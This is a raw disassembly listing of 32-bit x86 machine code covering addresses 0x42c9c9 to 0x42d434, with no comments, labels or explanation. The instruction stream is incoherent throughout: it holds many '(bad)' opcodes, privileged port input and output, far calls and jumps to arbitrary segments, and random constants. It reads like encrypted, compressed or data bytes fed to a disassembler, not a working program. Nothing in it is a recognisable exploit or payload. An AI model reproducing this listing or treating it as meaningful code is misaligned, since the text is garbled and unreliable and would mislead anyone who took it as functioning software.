  42c9c9:	add    BYTE PTR [eax],al
  42c9cb:	add    BYTE PTR [esp+edi*8+0x7b],al
  42c9cf:	sbb    DWORD PTR [ebx-0x3f],ecx
  42c9d2:	out    0x22,al
  42c9d4:	jns    0x42c981
  42c9d6:	(bad)  
  42c9d7:	xchg   ebp,eax
  42c9d8:	cmp    edi,DWORD PTR [edx+ecx*1+0x25dc0efb]
  42c9df:	loopne 0x42ca0a
  42c9e1:	and    BYTE PTR [ebx],al
  42c9e3:	rcr    edx,cl
  42c9e5:	sbb    ebx,ecx
  42c9e7:	in     al,dx
  42c9e8:	mov    eax,ds:0x1793b4b5
  42c9ed:	sub    esi,DWORD PTR ds:0x6a198cfd
  42c9f3:	aad    0xb4
  42c9f5:	pop    ds
  42c9f6:	mov    ebp,0xbc780f90
  42c9fb:	loope  0x42ca6b
  42c9fd:	jb     0x42ca35
  42c9ff:	popw   es
  42ca01:	cld    
  42ca02:	xlat   BYTE PTR ds:[ebx]
  42ca03:	aas    
  42ca04:	ja     0x42c9e5
  42ca06:	cmc    
  42ca07:	shl    DWORD PTR [eax+ebp*1-0x4cdba10d],1
  42ca0e:	add    DWORD PTR [ebp+0x5b],0xc
  42ca12:	lahf   
  42ca13:	lds    edx,FWORD PTR [esi+0x36]
  42ca16:	add    al,ch
  42ca18:	repz sub edx,DWORD PTR [esi]
  42ca1b:	loope  0x42ca86
  42ca1d:	and    eax,0x7787512a
  42ca22:	enter  0x1752,0x73
  42ca26:	sti    
  42ca27:	shr    BYTE PTR [eax+0x6b],0x38
  42ca2b:	push   esi
  42ca2c:	sub    eax,0xf2ca7ee6
  42ca31:	dec    ebp
  42ca32:	inc    edi
  42ca33:	fs ret 0x6708
  42ca37:	loopne 0x42ca79
  42ca39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ca3a:	pop    edi
  42ca3b:	mov    cl,0x1d
  42ca3d:	mov    ebp,DWORD PTR [ecx-0x599f59d8]
  42ca43:	and    BYTE PTR [ecx+0x8c18c59],bl
  42ca49:	call   0x2679:0x4f534943
  42ca50:	inc    ebp
  42ca51:	jnp    0x42ca36
  42ca53:	into   
  42ca54:	scas   eax,DWORD PTR es:[edi]
  42ca55:	push   0xf
  42ca57:	gs mov eax,0x782e145b
  42ca5d:	xchg   esp,eax
  42ca5e:	jg     0x42ca54
  42ca60:	cli    
  42ca61:	retf   0x9148
  42ca64:	adc    edi,ecx
  42ca66:	push   0x54
  42ca68:	mov    cl,0x29
  42ca6a:	repnz xchg ch,dh
  42ca6d:	int3   
  42ca6e:	mov    esp,0xfa7f75f0
  42ca73:	imul   esi,ebp,0xac07a053
  42ca79:	or     DWORD PTR [ecx],eax
  42ca7b:	mov    ds:0xb4288b71,al
  42ca80:	cmp    ecx,edx
  42ca82:	not    DWORD PTR [ecx]
  42ca84:	cld    
  42ca85:	dec    eax
  42ca86:	jb     0x42ca1a
  42ca88:	int    0xfc
  42ca8a:	sbb    al,BYTE PTR cs:[ebx]
  42ca8d:	lods   eax,DWORD PTR ds:[esi]
  42ca8e:	mov    esp,0x42c82058
  42ca93:	fist   WORD PTR [eax]
  42ca95:	lds    edx,FWORD PTR [edi]
  42ca97:	dec    cx
  42ca99:	xlat   BYTE PTR ds:[ebx]
  42ca9a:	std    
  42ca9b:	cmp    eax,0xf360563b
  42caa0:	shl    BYTE PTR [ecx+ebp*8],cl
  42caa3:	shr    BYTE PTR [esp+eiz*2-0x17],1
  42caa7:	push   ecx
  42caa8:	jb     0x42ca9b
  42caaa:	aad    0xdc
  42caac:	in     al,0x4c
  42caae:	out    0xa0,eax
  42cab0:	lds    edx,FWORD PTR [edx+0x6d]
  42cab3:	sahf   
  42cab4:	popa   
  42cab5:	scas   al,BYTE PTR es:[edi]
  42cab6:	dec    ebp
  42cab7:	pop    edi
  42cab8:	or     dh,dh
  42caba:	add    al,0x91
  42cabc:	(bad)  
  42cabd:	mov    cl,0x8e
  42cabf:	aad    0xe2
  42cac1:	cmp    eax,0x0
	...
  42cb32:	add    BYTE PTR [eax],al
  42cb34:	xor    al,0x28
  42cb36:	add    DWORD PTR [esi],eax
  42cb38:	sbb    eax,0x6e3a372f
  42cb3d:	(bad)  
  42cb3e:	sbb    al,al
  42cb40:	xchg   al,dl
  42cb42:	in     al,0x6c
  42cb44:	mov    al,ds:0xf60001d9
  42cb49:	add    BYTE PTR [eax],al
  42cb4b:	add    BYTE PTR [ecx],dl
  42cb4d:	fisubr WORD PTR [esi+0x79]
  42cb50:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  42cb52:	push   ebp
  42cb53:	xchg   esi,eax
  42cb54:	sub    DWORD PTR [edx],esi
  42cb56:	js     0x42cb55
  42cb58:	push   ss
  42cb59:	ret    0xa03a
  42cb5c:	cmp    BYTE PTR ds:0x742a8c3e,dl
  42cb62:	stos   DWORD PTR es:[edi],eax
  42cb63:	mov    eax,0x8339a8c7
  42cb68:	ins    BYTE PTR es:[edi],dx
  42cb69:	repnz out 0x9d,eax
  42cb6c:	cmp    ebx,DWORD PTR [ebp+0x2cf67d30]
  42cb72:	test   BYTE PTR [ebx-0x3d7ae5b4],al
  42cb78:	sbb    DWORD PTR [esi-0x8],esp
  42cb7b:	dec    ebp
  42cb7c:	xor    BYTE PTR [ecx-0x48],ah
  42cb7f:	loope  0x42cb9e
  42cb81:	add    al,0xaa
  42cb83:	hlt    
  42cb84:	imul   ebx,DWORD PTR [edx-0x20e8da98],0xffffffcd
  42cb8b:	scas   eax,DWORD PTR es:[edi]
  42cb8c:	hlt    
  42cb8d:	fldenv [esi]
  42cb8f:	mov    WORD PTR [esi+0x45],gs
  42cb92:	jl     0x42cb82
  42cb94:	adc    eax,0xbba176d
  42cb99:	xchg   DWORD PTR [edx+0x51],edi
  42cb9c:	mov    DWORD PTR [ecx+esi*8+0x16],edi
  42cba0:	out    dx,eax
  42cba1:	data16 stc 
  42cba3:	pushf  
  42cba4:	mov    ecx,DWORD PTR [ebx+0x6b43b20a]
  42cbaa:	cs mov ah,0x20
  42cbad:	js     0x42cba6
  42cbaf:	xor    al,0xec
  42cbb1:	shl    DWORD PTR [esi-0x4b],1
  42cbb4:	fdiv   DWORD PTR ds:[edi-0x77ad2769]
  42cbbb:	les    edx,FWORD PTR [ecx]
  42cbbd:	lods   al,BYTE PTR ds:[esi]
  42cbbe:	xchg   esp,eax
  42cbbf:	gs aaa 
  42cbc1:	ret    
  42cbc2:	push   0x34
  42cbc4:	jge    0x42cb95
  42cbc6:	xor    eax,0x452019cc
  42cbcb:	mov    edi,0x1ae26f74
  42cbd0:	and    DWORD PTR [edi],ecx
  42cbd2:	fcomp  QWORD PTR [edi]
  42cbd4:	jp     0x42cc30
  42cbd6:	mov    edx,0x8c0d4d2d
  42cbdb:	cld    
  42cbdc:	pop    DWORD PTR ds:0x1295b186
  42cbe2:	cld    
  42cbe3:	mov    ebp,0xd79965bd
  42cbe8:	jp     0x42cbff
  42cbea:	fcom   QWORD PTR [ecx+0x5e8e77cf]
  42cbf0:	jnp    0x42cb95
  42cbf2:	push   ebp
  42cbf3:	nop
  42cbf4:	mov    ds:0xb9010154,al
  42cbf9:	or     esi,DWORD PTR [esi+0x7eb5c921]
  42cbff:	lods   eax,DWORD PTR ds:[esi]
  42cc00:	and    BYTE PTR [ecx+eax*2],0xc8
  42cc04:	push   ebp
  42cc05:	sti    
  42cc06:	sbb    al,0x8
  42cc08:	mov    es,WORD PTR [ebx-0x4e]
  42cc0b:	inc    esp
  42cc0c:	mov    eax,edx
  42cc0e:	or     DWORD PTR ds:[edx-0x76e789cd],esp
  42cc15:	cld    
  42cc16:	lea    ecx,[ebx-0x7f]
  42cc19:	fcmovne st,st(2)
  42cc1b:	lock fild DWORD PTR [edi+0x5267da22]
  42cc22:	retf   0x3d56
  42cc25:	in     al,dx
  42cc26:	inc    ebx
  42cc27:	jle    0x42cbeb
  42cc29:	jno    0x42cc1e
  42cc2b:	mov    edx,0x5b5bacb2
  42cc30:	dec    eax
  42cc31:	in     eax,0xa3
  42cc33:	or     eax,0xf63d9cd6
  42cc38:	xor    bh,ch
  42cc3a:	add    BYTE PTR [eax-0x4f],ch
  42cc3d:	or     DWORD PTR [esi],esp
  42cc3f:	lea    ecx,[esi]
  42cc41:	inc    DWORD PTR [eax]
	...
  42ccb3:	add    BYTE PTR [eax-0x61eb634a],dh
  42ccb9:	ds mov eax,0xcad7b5b6
  42ccbf:	sub    ecx,DWORD PTR [eax+edi*8+0x41]
  42ccc3:	rcl    BYTE PTR [esi-0x9fffe26],cl
  42ccc9:	add    BYTE PTR [eax],al
  42cccb:	add    dh,dh
  42cccd:	xchg   ebx,eax
  42ccce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cccf:	sub    al,0x4c
  42ccd1:	mov    bh,0x32
  42ccd3:	popa   
  42ccd4:	pop    ebp
  42ccd5:	into   
  42ccd6:	cmp    cl,BYTE PTR [esi+0x76e70e1e]
  42ccdc:	test   al,bl
  42ccde:	dec    esp
  42ccdf:	add    ebx,DWORD PTR ds:0x2275c124
  42cce5:	sbb    dl,cl
  42cce7:	cmp    edi,DWORD PTR [ecx+0x1a]
  42ccea:	mov    ebp,0xf6dbc0cf
  42ccef:	add    DWORD PTR [edi+0x21],esi
  42ccf2:	sbb    eax,0xa94ea2e9
  42ccf7:	mov    bh,0xe4
  42ccf9:	cmp    DWORD PTR [eax+edi*1-0x55c08eac],ebx
  42cd00:	ja     0x42ccfa
  42cd02:	jne    0x42cd22
  42cd04:	pusha  
  42cd05:	frstor [esi]
  42cd07:	sub    ebx,eax
  42cd09:	neg    BYTE PTR ds:0x6a63ecf0
  42cd0f:	add    edi,DWORD PTR [edx-0x6eb26451]
  42cd15:	ss push edx
  42cd17:	push   0x7d280e3e
  42cd1c:	push   cs
  42cd1d:	cwde   
  42cd1e:	jg     0x42cd05
  42cd20:	pop    es
  42cd21:	inc    esi
  42cd22:	imul   edi,DWORD PTR [ecx-0x25],0x41be252d
  42cd29:	or     ebp,DWORD PTR [edx-0x601e817e]
  42cd2f:	push   0xc78fa8f
  42cd34:	lods   al,BYTE PTR ds:[esi]
  42cd35:	sbb    eax,0xa7b4dd2c
  42cd3a:	cmp    eax,0xb34895e6
  42cd3f:	(bad)  
  42cd40:	call   0x8064:0x3569f9a0
  42cd47:	and    al,al
  42cd49:	shl    DWORD PTR [eax],cl
  42cd4b:	gs xchg ebx,eax
  42cd4d:	fisttp WORD PTR [ebx]
  42cd4f:	xchg   ecx,edx
  42cd51:	push   esi
  42cd52:	das    
  42cd53:	sub    eax,0x7a6f0f3b
  42cd58:	rcr    BYTE PTR [ebx+0x5feaeb8c],0x19
  42cd5f:	out    0x64,eax
  42cd61:	or     dh,BYTE PTR [edx-0x2576fff1]
  42cd67:	js     0x42cd51
  42cd69:	mov    ebx,0x8572ed0a
  42cd6e:	mov    BYTE PTR [eax],dl
  42cd70:	(bad)  
  42cd71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cd72:	push   0x6216988d
  42cd77:	hlt    
  42cd78:	push   edx
  42cd79:	jb     0x42cdad
  42cd7b:	jbe    0x42cdfa
  42cd7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cd7e:	jmp    0x42cdab
  42cd80:	push   ebp
  42cd81:	sub    dl,BYTE PTR [eax+0x52]
  42cd84:	push   ss
  42cd85:	rol    BYTE PTR [esi-0xc0304e9],0xff
  42cd8c:	xchg   ecx,eax
  42cd8d:	sti    
  42cd8e:	inc    edx
  42cd8f:	jnp    0x42cd94
  42cd91:	loope  0x42cdc1
  42cd93:	in     eax,dx
  42cd94:	stc    
  42cd95:	jne    0x42cdb5
  42cd97:	loop   0x42cd65
  42cd99:	out    dx,al
  42cd9a:	adc    BYTE PTR [eax],cl
  42cd9c:	pop    es
  42cd9d:	(bad)  
  42cd9e:	ds sub eax,0x6e4daa94
  42cda4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cda5:	jnp    0x42cdf5
  42cda7:	push   eax
  42cda8:	pop    ecx
  42cda9:	push   ds
  42cdaa:	adc    dh,BYTE PTR [eax]
  42cdac:	cmp    ch,BYTE PTR [esi-0x52]
  42cdaf:	outs   dx,BYTE PTR ds:[esi]
  42cdb0:	sub    DWORD PTR [esp+edx*4-0x1fc8f89],ebp
  42cdb7:	mov    esp,0x7035d1dd
  42cdbc:	hlt    
  42cdbd:	push   edx
  42cdbe:	mov    DWORD PTR [edi+0x16],ecx
  42cdc1:	out    dx,al
	...
  42ce32:	add    BYTE PTR [eax],al
  42ce34:	xchg   edi,eax
  42ce35:	and    BYTE PTR [edi-0x26],al
  42ce38:	idiv   edi
  42ce3a:	lahf   
  42ce3b:	ins    DWORD PTR es:[edi],dx
  42ce3c:	mov    edx,0xfc19410a
  42ce41:	daa    
  42ce42:	popa   
  42ce43:	stos   DWORD PTR es:[edi],eax
  42ce44:	mov    ebx,ds
  42ce46:	add    DWORD PTR [eax],eax
  42ce48:	test   BYTE PTR [eax],0x0
  42ce4b:	add    BYTE PTR [eax-0x9fe77b6],ch
  42ce51:	push   0x59
  42ce53:	jnp    0x42cddb
  42ce55:	xor    DWORD PTR [ebx+0x2],edi
  42ce58:	in     al,0xdd
  42ce5a:	adc    eax,0x60c4edff
  42ce5f:	dec    esi
  42ce60:	jne    0x42ce12
  42ce62:	call   0x2851:0x931cb94a
  42ce69:	or     BYTE PTR [eax],dl
  42ce6b:	push   edi
  42ce6c:	ins    DWORD PTR es:[edi],dx
  42ce6d:	push   edi
  42ce6e:	mov    esi,ebp
  42ce70:	push   eax
  42ce71:	lods   al,BYTE PTR ss:[esi]
  42ce73:	cs popa 
  42ce75:	je     0x42ce2d
  42ce77:	in     al,0x45
  42ce79:	jmp    0x42ce5c
  42ce7b:	cmp    dh,BYTE PTR [ebx-0x735b5d66]
  42ce81:	mov    edx,DWORD PTR [edi-0x50]
  42ce84:	add    ah,BYTE PTR [ebx-0x2d]
  42ce87:	mov    cl,0xb
  42ce89:	and    eax,0xfbc677a
  42ce8e:	and    eax,0x58bc6890
  42ce93:	hlt    
  42ce94:	jne    0x42ce60
  42ce96:	cmp    cl,ah
  42ce98:	fwait
  42ce99:	cmp    BYTE PTR [eax-0x4c],ah
  42ce9c:	into   
  42ce9d:	sub    al,0xd5
  42ce9f:	test   al,0x5f
  42cea1:	mov    es,edi
  42cea3:	mov    BYTE PTR [ebx-0x47b2f845],dh
  42cea9:	jp     0x42ce4e
  42ceab:	sbb    al,0x5d
  42cead:	fdiv   st(1),st
  42ceaf:	es shr cl,cl
  42ceb2:	outs   dx,BYTE PTR ds:[esi]
  42ceb3:	pop    ecx
  42ceb4:	jecxz  0x42ceb0
  42ceb6:	fptan  
  42ceb8:	fwait
  42ceb9:	sti    
  42ceba:	mov    ecx,0x8ece4ab5
  42cebf:	frstor [ebp-0x6b7a7167]
  42cec5:	jne    0x42ce66
  42cec7:	push   0x54418ca
  42cecc:	ret    0x57af
  42cecf:	mov    esi,DWORD PTR [esi-0xe874943]
  42ced5:	sbb    BYTE PTR [edx+0x59683410],ah
  42cedb:	mov    eax,ds:0x1d20a978
  42cee0:	pop    ecx
  42cee1:	sbb    bh,ch
  42cee3:	outs   dx,BYTE PTR ds:[esi]
  42cee4:	fnstsw WORD PTR [ebp+0x3e067205]
  42ceea:	hlt    
  42ceeb:	les    ebx,FWORD PTR [ebx+edx*8-0x1f53ede7]
  42cef2:	jae    0x42cee0
  42cef4:	add    ecx,DWORD PTR [edi]
  42cef6:	xor    ebp,DWORD PTR [bx-0x4437]
  42cefb:	sub    dl,cl
  42cefd:	and    al,0xf2
  42ceff:	mov    ds:0x47a3ecfb,eax
  42cf04:	fdiv   QWORD PTR [edi]
  42cf06:	js     0x42cf05
  42cf08:	or     DWORD PTR [ecx-0x9],esi
  42cf0b:	adc    al,0xb2
  42cf0d:	xor    BYTE PTR [ecx],0xef
  42cf10:	imul   edi,DWORD PTR [ecx],0x42d92912
  42cf16:	push   cs
  42cf17:	cdq    
  42cf18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cf19:	test   DWORD PTR [eax-0x1b],ebp
  42cf1c:	dec    ax
  42cf1e:	lods   eax,DWORD PTR ds:[esi]
  42cf1f:	mov    esi,0x22145a4b
  42cf24:	repnz xchg esi,eax
  42cf26:	aas    
  42cf27:	push   ecx
  42cf28:	test   eax,0x3a096fed
  42cf2d:	pop    ds
  42cf2e:	inc    edi
  42cf2f:	out    dx,eax
  42cf30:	jb     0x42cf2a
  42cf32:	add    ebp,DWORD PTR [ebp+0xe]
  42cf35:	out    dx,al
  42cf36:	jp     0x42cf35
  42cf38:	enter  0xaf97,0xca
  42cf3c:	sahf   
  42cf3d:	fsub   QWORD PTR [ebx]
  42cf3f:	cwde   
  42cf40:	aaa    
  42cf41:	cmp    eax,DWORD PTR [eax]
	...
  42cfb3:	add    BYTE PTR [edx],bh
  42cfb5:	xchg   edx,eax
  42cfb6:	ja     0x42cfea
  42cfb8:	push   edi
  42cfba:	jg     0x42cf56
  42cfbc:	loope  0x42cfcc
  42cfbe:	cs mov al,0xfc
  42cfc1:	sub    dh,BYTE PTR [esp+esi*8-0x7e]
  42cfc5:	fadd   QWORD PTR [ecx]
  42cfc7:	add    dh,dh
  42cfc9:	add    BYTE PTR [eax],al
  42cfcb:	add    al,ah
  42cfcd:	cmp    esi,ebp
  42cfcf:	outs   dx,BYTE PTR ds:[esi]
  42cfd0:	cdq    
  42cfd1:	xchg   esi,eax
  42cfd2:	inc    ebx
  42cfd3:	bound  eax,QWORD PTR ds:0x38d8664f
  42cfd9:	fnstcw WORD PTR [edx+0x35]
  42cfdc:	fbstp  TBYTE PTR [eax]
  42cfde:	call   DWORD PTR [esi-0x19ee8384]
  42cfe4:	dec    esp
  42cfe5:	clc    
  42cfe6:	gs push esp
  42cfe8:	or     DWORD PTR [ecx+0x1cc170b9],0xa
  42cfef:	xchg   edi,eax
  42cff0:	rol    BYTE PTR ds:[esi],cl
  42cff3:	scas   al,BYTE PTR es:[edi]
  42cff4:	xor    BYTE PTR [ebx-0x6e],bl
  42cff7:	push   ebx
  42cff8:	mov    esp,es
  42cffa:	adc    bh,cl
  42cffc:	mov    ebp,0x6bbfe59c
  42d001:	or     BYTE PTR [edi+0xc],0x74
  42d005:	out    0x58,al
  42d007:	ror    BYTE PTR [ebx],cl
  42d009:	ss lahf 
  42d00b:	cmp    al,BYTE PTR [eax+ebp*4]
  42d00e:	in     eax,0x3b
  42d010:	popf   
  42d011:	out    0xff,eax
  42d013:	push   ecx
  42d014:	and    eax,0x971c5c00
  42d019:	sub    bh,ch
  42d01b:	in     eax,0x9e
  42d01d:	add    eax,0x1e9b56b9
  42d022:	pop    edi
  42d023:	or     al,0xfc
  42d025:	push   esp
  42d026:	(bad)  
  42d027:	loopne 0x42cfdd
  42d029:	sbb    BYTE PTR [esi],bl
  42d02b:	mov    ch,0xae
  42d02d:	inc    ecx
  42d02e:	sahf   
  42d02f:	jne    0x42cfcd
  42d031:	out    0xc4,eax
  42d033:	mov    eax,0xbf309d4f
  42d038:	jp     0x42d094
  42d03a:	and    BYTE PTR [edi-0x5f019a85],ch
  42d040:	int3   
  42d041:	adc    eax,0x15e0c076
  42d046:	and    ecx,ebx
  42d048:	shr    bl,cl
  42d04a:	sbb    DWORD PTR [esi],esp
  42d04c:	out    dx,eax
  42d04d:	xchg   BYTE PTR ds:0x35396724,al
  42d053:	mov    DWORD PTR [edx+eax*4-0x3e],ebx
  42d057:	dec    ebx
  42d058:	xor    ebx,DWORD PTR [ecx-0x5dd3d5d9]
  42d05e:	push   ebp
  42d05f:	dec    esi
  42d060:	out    dx,eax
  42d061:	dec    edx
  42d062:	repz and DWORD PTR [esi],eax
  42d065:	jmp    0x99a2:0x91edd50
  42d06c:	jl     0x42d074
  42d06e:	cs inc ebp
  42d070:	mov    eax,0x3264dc4
  42d075:	cmp    eax,0xc0426aa5
  42d07a:	in     eax,0x68
  42d07c:	sar    BYTE PTR [eax-0x43],cl
  42d07f:	sbb    ah,bl
  42d081:	repnz adc al,0xf7
  42d084:	mov    BYTE PTR [esi+ebp*8+0x27],0x9d
  42d089:	dec    edx
  42d08a:	xor    ebx,DWORD PTR ds:0xda8b3651
  42d090:	jnp    0x42d0b1
  42d092:	cmp    DWORD PTR [ebp+0x71fc534],ecx
  42d098:	xor    al,0x17
  42d09a:	pop    ecx
  42d09b:	popf   
  42d09c:	ret    0xa22c
  42d09f:	jo     0x42d098
  42d0a1:	mov    ds:0x2c0a61a7,al
  42d0a6:	(bad)  
  42d0a7:	xor    eax,0x2741d8c1
  42d0ac:	not    BYTE PTR [ecx-0x14]
  42d0af:	mov    edi,0xb69497ca
  42d0b4:	es test edi,esp
  42d0b7:	cmp    al,0x78
  42d0b9:	cmp    esi,DWORD PTR [ebx]
  42d0bb:	pop    esi
  42d0bc:	inc    esp
  42d0bd:	dec    ecx
  42d0be:	in     eax,0xde
  42d0c0:	push   edi
  42d0c1:	ja     0x42d0c3
	...
  42d133:	add    BYTE PTR [ecx-0x7e],ch
  42d136:	int    0xae
  42d138:	out    dx,eax
  42d139:	out    dx,eax
  42d13a:	imul   eax,edi,0x41
  42d13d:	cdq    
  42d13e:	xor    eax,0xf222450
  42d143:	cmp    BYTE PTR [eax-0x23],0x1
  42d147:	add    dh,dh
  42d149:	add    BYTE PTR [eax],al
  42d14b:	add    dl,ch
  42d14d:	inc    edi
  42d14e:	push   esp
  42d14f:	mov    cl,0x69
  42d151:	xchg   DWORD PTR [ebx],ecx
  42d153:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d154:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d155:	int3   
  42d156:	and    ebx,DWORD PTR [edx]
  42d158:	ds loope 0x42d14f
  42d15b:	and    DWORD PTR [edx+0x40],ebx
  42d15e:	fldz   
  42d160:	dec    ebx
  42d161:	jb     0x42d1b1
  42d163:	mov    esp,0xec6ef0f7
  42d168:	inc    ebp
  42d169:	xor    DWORD PTR [ebx-0x55],ecx
  42d16c:	jbe    0x42d119
  42d16e:	mov    DWORD PTR gs:[ebx+0x1a646eb4],eax
  42d175:	xor    BYTE PTR [eax-0x36be7c4d],cl
  42d17b:	out    dx,eax
  42d17c:	jb     0x42d18f
  42d17e:	leave  
  42d17f:	retf   
  42d180:	out    0xef,al
  42d182:	mov    edx,0xffd44478
  42d187:	and    DWORD PTR [ebp-0x5b],edi
  42d18a:	xor    DWORD PTR [eax-0x4c458e66],edi
  42d190:	outs   dx,BYTE PTR ds:[esi]
  42d191:	lods   eax,DWORD PTR ds:[esi]
  42d192:	rcl    esi,1
  42d194:	pop    ebp
  42d195:	push   ebx
  42d196:	loopne 0x42d17c
  42d198:	inc    esi
  42d199:	mov    esp,0x1fd4aee8
  42d19e:	test   BYTE PTR [ebx+0x11],cl
  42d1a1:	push   edi
  42d1a2:	cli    
  42d1a3:	dec    esi
  42d1a4:	mov    cl,0x14
  42d1a6:	hlt    
  42d1a7:	sub    BYTE PTR [ecx-0x558e3276],bh
  42d1ad:	scas   al,BYTE PTR es:[edi]
  42d1ae:	inc    ebp
  42d1af:	(bad)  
  42d1b1:	mov    DWORD PTR [ecx],esi
  42d1b3:	sub    al,0xa1
  42d1b5:	jb     0x42d18d
  42d1b7:	add    ecx,ebx
  42d1b9:	jmp    0x7aa5:0x421919ff
  42d1c0:	sub    BYTE PTR [ecx+esi*2],cl
  42d1c3:	loope  0x42d168
  42d1c5:	int3   
  42d1c6:	inc    esi
  42d1c7:	sbb    edx,edx
  42d1c9:	jno    0x42d1e3
  42d1cb:	add    eax,DWORD PTR [ebp+0x75bc7462]
  42d1d1:	dec    edx
  42d1d2:	add    ecx,DWORD PTR [ecx]
  42d1d4:	iret   
  42d1d5:	(bad)  
  42d1d6:	xchg   edx,eax
  42d1d7:	repnz out 0x2c,al
  42d1da:	add    edx,DWORD PTR [esi+0x102e366e]
  42d1e0:	mov    BYTE PTR [edi+ecx*2-0x6b3b5adb],cl
  42d1e7:	mov    ecx,0x94668abc
  42d1ec:	and    al,0x5c
  42d1ee:	push   fs
  42d1f0:	ins    BYTE PTR es:[edi],dx
  42d1f1:	cmp    BYTE PTR [ebx-0x6a],bh
  42d1f4:	bnd jo 0x42d192
  42d1f7:	push   ecx
  42d1f8:	jno    0x42d1d3
  42d1fa:	imul   esi,DWORD PTR [eax-0xd],0x18277b91
  42d201:	neg    BYTE PTR [ebx+eax*1]
  42d204:	jb     0x42d217
  42d206:	inc    esp
  42d207:	aam    0x19
  42d209:	jl     0x42d238
  42d20b:	loopne 0x42d23e
  42d20d:	hlt    
  42d20e:	mov    esp,0xbdfa9d6e
  42d213:	(bad)  
  42d214:	fmul   st(0),st
  42d216:	mov    ecx,0x6e178d9
  42d21b:	jecxz  0x42d272
  42d21d:	mov    ds:0x9a7bab03,eax
  42d222:	nop
  42d223:	hlt    
  42d224:	popf   
  42d225:	lea    ebp,[edi]
  42d227:	xchg   esp,eax
  42d228:	xchg   edi,eax
  42d229:	in     al,0xf6
  42d22b:	or     eax,0xde2a3132
  42d230:	jge    0x42d286
  42d232:	loope  0x42d247
  42d234:	fs int3 
  42d236:	fdiv   QWORD PTR [ecx]
  42d238:	and    eax,0x69c100a0
  42d23d:	sub    eax,DWORD PTR [ebx+edi*8]
  42d240:	add    al,0x16
	...
  42d2b2:	add    BYTE PTR [eax],al
  42d2b4:	out    0xf,al
  42d2b6:	fldcw  WORD PTR [ebp-0x7]
  42d2b9:	push   esi
  42d2bb:	(bad)  
  42d2bc:	xchg   ebp,eax
  42d2bd:	fsubr  DWORD PTR [esi-0x16]
  42d2c0:	ret    0x6753
  42d2c3:	loopne 0x42d333
  42d2c5:	fiadd  WORD PTR [ecx]
  42d2c7:	add    dh,dh
  42d2c9:	add    BYTE PTR [eax],al
  42d2cb:	add    BYTE PTR [ecx-0x507fd9ce],al
  42d2d1:	mov    bl,0x40
  42d2d3:	jne    0x42d25e
  42d2d5:	inc    ebx
  42d2d6:	xlat   BYTE PTR ds:[ebx]
  42d2d7:	jo     0x42d2fe
  42d2d9:	xor    al,0x5c
  42d2db:	sbb    DWORD PTR [eax+0x5d060b0a],edi
  42d2e1:	mov    fs,WORD PTR [ecx+edx*1-0xa26a660]
  42d2e8:	mov    ?,ebx
  42d2ea:	xchg   BYTE PTR [edx+ebx*4],dh
  42d2ed:	sbb    esi,DWORD PTR [ecx-0x68f86582]
  42d2f3:	fcomip st,st(7)
  42d2f5:	enter  0x3aa1,0xe6
  42d2f9:	ins    BYTE PTR es:[edi],dx
  42d2fa:	dec    ebp
  42d2fb:	push   ecx
  42d2fc:	fsub   QWORD PTR [ebx-0x56870ae3]
  42d302:	xchg   edi,eax
  42d303:	bound  ecx,QWORD PTR [ecx-0x76e92aea]
  42d309:	adc    dl,0x3f
  42d30c:	add    edi,DWORD PTR [ebx]
  42d30e:	and    DWORD PTR [ecx+0x2d],ecx
  42d311:	pop    ebx
  42d312:	ss rcr eax,cl
  42d315:	dec    esi
  42d316:	out    dx,al
  42d317:	xor    edi,edi
  42d319:	cs repz aam 0xc5
  42d31d:	call   0xcf3272cb
  42d322:	dec    esi
  42d323:	sar    edi,cl
  42d325:	pop    esp
  42d326:	hlt    
  42d327:	mov    bh,0xcf
  42d329:	aad    0x81
  42d32b:	in     eax,0x2c
  42d32d:	pushf  
  42d32e:	push   edi
  42d32f:	loopne 0x42d36a
  42d331:	adc    al,0x77
  42d333:	ins    DWORD PTR es:[edi],dx
  42d334:	pop    ds
  42d335:	scas   eax,DWORD PTR es:[edi]
  42d336:	adc    ch,BYTE PTR ds:0xdd2735de
  42d33c:	pop    es
  42d33d:	gs xchg esp,eax
  42d33f:	int    0xef
  42d341:	fld    TBYTE PTR [ecx+0x3b93147]
  42d347:	icebp  
  42d348:	pop    ebx
  42d349:	in     al,0xb7
  42d34b:	push   es
  42d34c:	inc    esp
  42d34d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d34e:	adc    ebx,ecx
  42d350:	xor    eax,0xf39ba4db
  42d355:	mov    DWORD PTR [edx],0x6c410485
  42d35b:	loope  0x42d380
  42d35d:	and    DWORD PTR [eax+ecx*4-0x23],0x65e82c65
  42d365:	mov    dh,BYTE PTR [ebx+eax*2-0x28]
  42d369:	ror    DWORD PTR ds:[esi],1
  42d36c:	adc    edx,DWORD PTR [ebp+edx*2-0x4e890830]
  42d373:	std    
  42d374:	ja     0x42d3cf
  42d376:	idiv   DWORD PTR [edi+0x2c0b5a2d]
  42d37c:	xor    ch,BYTE PTR [eax]
  42d37e:	add    ecx,DWORD PTR [edx-0x54]
  42d381:	cmp    ebp,DWORD PTR [edx]
  42d383:	ins    DWORD PTR es:[edi],dx
  42d384:	mov    al,0x9b
  42d386:	test   eax,0x2e406152
  42d38b:	call   0x6d4c:0xd9e22ef
  42d392:	mov    ecx,0x8c17d045
  42d397:	add    eax,edi
  42d399:	cdq    
  42d39a:	idiv   bh
  42d39c:	out    0x87,eax
  42d39e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d39f:	popf   
  42d3a0:	sub    BYTE PTR [edi+0x40556a1c],ah
  42d3a6:	loope  0x42d40c
  42d3a8:	test   al,0x2
  42d3aa:	pop    edx
  42d3ab:	push   ecx
  42d3ac:	push   edx
  42d3ad:	mov    al,0x36
  42d3af:	je     0x42d3ac
  42d3b1:	or     BYTE PTR [ecx-0x50e77651],bh
  42d3b7:	repz sbb ebx,esi
  42d3ba:	pop    eax
  42d3bb:	mov    edx,0x3626b937
  42d3c0:	mov    al,0x31
	...
  42d432:	add    BYTE PTR [eax],al
  42d434:	in     al,dx
